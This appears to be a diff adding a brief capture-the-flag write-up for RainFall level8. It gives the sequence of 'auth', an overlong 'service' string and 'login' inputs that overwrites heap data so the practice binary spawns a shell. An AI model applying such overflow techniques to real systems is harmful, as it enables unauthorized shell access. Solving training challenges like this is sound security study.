@@ -1,0 +1,16 @@
+After dissassemble the binary, we understood that we have to send this :
+
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth abcdefghijklmnopqrstuvwxyz
+0x804a008, (nil) 
+serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+0x804a008, 0x804a018 
+login
+$
+
+the binary make a system('/bin/bash') when the first condition is respected
+and when we send "service" 
+the binary verifies that during the "login"
+the 32nd character is not 0.
+
